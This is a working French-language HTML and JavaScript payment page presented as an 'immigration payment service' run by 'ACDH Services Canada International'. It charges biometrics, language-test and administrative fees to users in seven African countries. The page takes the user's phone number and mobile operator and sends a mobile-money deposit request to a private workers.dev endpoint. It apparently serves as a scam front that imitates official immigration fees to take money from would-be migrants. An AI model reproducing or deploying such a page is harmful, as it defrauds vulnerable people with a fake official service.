<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement ACDH</title>

<style>
body {
  font-family: Arial;
  background:
    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
    url("background.jpg") no-repeat center;
  background-size: cover;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
}

/* animation */
.box {
  background:white;
  padding:30px;
  border-radius:12px;
  width:360px;
  text-align:center;
  animation: fadeIn 0.6s ease;
}

@keyframes fadeIn {
  from {opacity:0; transform:translateY(20px);}
  to {opacity:1; transform:translateY(0);}
}

.logo {
  width:120px;
  margin-bottom:5px;
}

.title {
  font-size:18px;
  font-weight:bold;
  margin-bottom:15px;
}

input, select {
  width:100%;
  padding:10px;
  margin-top:10px;
  border-radius:6px;
  border:1px solid #ccc;
}

/* prefix + numero */
.row {
  display:flex;
  gap:5px;
}

.prefix {
  width:30%;
  background:#eee;
}

.phone {
  width:70%;
}

button {
  width:100%;
  padding:12px;
  margin-top:15px;
  background:#00bcd4;
  color:white;
  border:none;
  border-radius:6px;
  font-weight:bold;
  cursor:pointer;
  transition:0.3s;
}

button:hover {
  background:#0097a7;
}

/* montant */
.amount-box {
  margin-top:10px;
  font-weight:bold;
}

#result {
  margin-top:15px;
  font-weight:bold;
}

/* footer */
.footer {
  position:absolute;
  bottom:10px;
  color:white;
  font-size:12px;
  text-align:center;
  width:100%;
}
</style>
</head>

<body>

<div class="box">

<img src="logo.png" class="logo">

<div class="title">Service Immigration Paiement</div>

<!-- SERVICES -->
<select id="service" onchange="updateAmount()">
  <option value="150">Données biométriques - 150 USD</option>
  <option value="150">Test de langue - 150 USD</option>
  <option value="220">Droit administratif - 220 USD</option>
  <option value="520">Tout payer - 520 USD</option>
</select>

<select id="country" onchange="updateOperators(); updateAmount()">
  <option value="CIV">Côte d'Ivoire</option>
  <option value="CMR">Cameroun</option>
  <option value="COD">RDC</option>
  <option value="COG">Congo</option>
  <option value="GAB">Gabon</option>
  <option value="SEN">Sénégal</option>
  <option value="BEN">Bénin</option>
</select>

<select id="operator"></select>

<div class="row">
  <input id="prefix" class="prefix" readonly>
  <input id="phone" class="phone" placeholder="Numéro">
</div>

<!-- montant auto -->
<div class="amount-box" id="displayAmount"></div>

<button onclick="payer()">Payer</button>

<p id="result"></p>

</div>

<div class="footer">
© 2026 ACDH Services Canada International — Plateforme sécurisée 🔒
</div>

<script>

// 💳 services USD
const services = {
  "150":150,
  "220":220,
  "520":520
};

// 🌍 taux (approx)
const rates = {
  XOF: 600,
  XAF: 600,
  CDF: 2500
};

const currencies = {
  BEN:"XOF", CIV:"XOF", SEN:"XOF",
  CMR:"XAF", GAB:"XAF", COG:"XAF",
  COD:"CDF"
};

const operators = {
  BEN:["MTN","MOOV"],
  CIV:["MTN","ORANGE"],
  CMR:["MTN"],
  COD:["AIRTEL","ORANGE","VODACOM"],
  GAB:["AIRTEL"],
  COG:["AIRTEL","MTN"],
  SEN:["ORANGE","FREE"]
};

const prefixes = {
  BEN:"229",
  CIV:"225",
  CMR:"237",
  COD:"243",
  COG:"242",
  GAB:"241",
  SEN:"221"
};

// update opérateurs + indicatif
function updateOperators(){
  operator.innerHTML="";
  operators[country.value].forEach(o=>{
    let opt=document.createElement("option");
    opt.value=o;
    opt.textContent=o;
    operator.appendChild(opt);
  });
  prefix.value = prefixes[country.value];
}

// montant auto
function updateAmount(){

  const usd = parseInt(service.value);
  const cur = currencies[country.value];

  const amount = usd * rates[cur];

  displayAmount.innerText = "Montant à payer : " + amount + " " + cur;
}

// paiement
async function payer(){

  result.innerText="⏳ Traitement...";

  const fullPhone = prefix.value + phone.value;

  const res = await fetch("https://orange-queen.serviceprive93.workers.dev/deposit",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({
      phone: fullPhone,
      amount: service.value,
      country: country.value,
      operator: operator.value
    })
  });

  const data = await res.json();

  result.innerText =
    data.status==="ACCEPTED"?"📲 Vérifiez votre téléphone":
    data.status==="PENDING"?"⏳ En attente":
    data.status==="SUCCESS"?"✅ Paiement confirmé":
    "❌ Échec";
}

// init
updateOperators();
updateAmount();

</script>

</body>
</html>
